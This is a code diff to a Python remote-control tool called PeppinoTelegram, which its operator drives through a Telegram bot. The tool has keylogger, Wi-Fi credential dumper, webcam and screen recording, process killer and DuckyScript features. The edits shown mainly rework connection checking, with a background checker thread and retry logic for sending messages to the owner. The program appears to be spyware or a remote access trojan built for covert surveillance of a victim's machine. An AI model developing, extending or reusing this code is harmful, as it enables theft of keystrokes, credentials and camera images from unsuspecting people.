@@ -140,14 +140,6 @@ else:
 def now() -> str:
     return datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
-def checkconn() -> bool:
-    try:
-        s = socket.socket()
-        s.connect(("www.google.com",80))
-        return True
-    except Exception as e:
-        return False
-
 #GETTING TOKEN AND CHAT_ID
 def getCred(filename:str=resource_path("auth.json")) -> tuple[str,int]:
     with open(filename) as fi:
@@ -338,8 +330,11 @@ class PeppinoTelegram:
         self.webcam_url = None
         self.screen_url = None
         self.webcam_and_screen_url = None
+
         self.process_killer_page = 0
         self.owner_name = ""
+        self.connected = check_connection()
+
         self.cap = capture
         self.bot = Bot(token) 
         self.cantopenlist = []
@@ -349,6 +344,7 @@ class PeppinoTelegram:
         self.audio_mixer = mixer
         self.running = True
         self.message_timeout = 5
+
         self.process_explorer_menu = None
         self.mixer_menu_keyboard = None
         self.mouse_controller_menu = None
@@ -356,6 +352,7 @@ class PeppinoTelegram:
         self.display_mode_keyboard  = None
         self.cantopenmenu_ref = None
         self.mainmenu_ref = None
+
         self.wifidumper = WifiDumper()
         self.all_session_messages: list[int] = []
 
@@ -560,10 +557,15 @@ class PeppinoTelegram:
         self.__play_loaded_sound("breath")
 
     def bsend(self, text: str, retries=0, parse_mode:str|None=None, reply_markup=None) -> int|None:
+        doit = True
         if retries>3:
             return
         try:
-            if checkconn():
+            # We only check connection when we're retrying
+            if retries>0:
+                sleep(.2)
+                doit = check_connection()
+            if doit:
                 message_id = self.bot.sendMessage(self.owner_id, text, parse_mode=parse_mode, reply_markup=reply_markup)["message_id"]
                 self.all_session_messages.append(message_id)
                 return message_id
@@ -832,7 +834,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
             self.owner_name = sender_name
 
             if content_type == "text":
-                Thread(target=self.parse_text, args=(msg,)).start()
+                self.parse_text(msg)
             elif content_type == "photo":
                 self.parse_photo(msg)
             elif content_type == "document":
@@ -1073,7 +1075,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
             ("🔒 Can't Open", "🔒 Can't Open List", "/menu_cantopen"),
             ("🧠 Keylogger", "🧠 Keylogger", "/menu_keylogger"),
             ("🦑 Misc", "🦑 Misc", "/menu_misc"),
-            ("🦆 DuckyScript", "🦆 DuckyScript", "/menu_duckyscript")
+            ("🦆 DuckyScript", "🦆 DuckyScript", "/menu_duckyscript"),
             ("🔌 PlugIns", "🔌 Your Plugins", "/menu_plugins"),
         ]:
             buttons[label] = submenu
@@ -1822,7 +1824,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
             self.bsend(f"Error while recording webcam {e}")
         bar.fill_and_delete()
 
-    #This code is like an impressive skycraper held by a little wire.
+    # This code is like an impressive skycraper held by a little wire.
 
     def record_webcam_and_screen(self, capture_duration: int=10, caption: str|None=None) -> None:
         capture_duration = int(capture_duration)
@@ -1946,6 +1948,12 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
             return self.ask_yesno("The program was unable to backup the wallpaper, do you still want to use this functionality Y/n")
         else:
             return True
+
+    def connectioncheckerloop(self):
+        while 1:
+            self.connected = check_connection()
+            sleep(60 if self.connected else 10)
+
 
     def setCameraAsWallpaper(self, seconds: float|int=5):
         if not self.confirmContuinuingWithoutWallpaperBackup():
@@ -2198,6 +2206,9 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         self.processmonthread = Thread(target=self.processmonitorloop)
         self.processmonthread.start()
         STARTING_LOG_MESSAGE.edit("PROCESS MONITOR STARTED")
+
+        self.connectioncheckerthread = Thread(target=self.connectioncheckerloop)
+        self.connectioncheckerthread.start()
 
         self.screen_width, self.screen_height = pg.size()
         STARTING_LOG_MESSAGE.edit("GOT SCREEN SIZE")
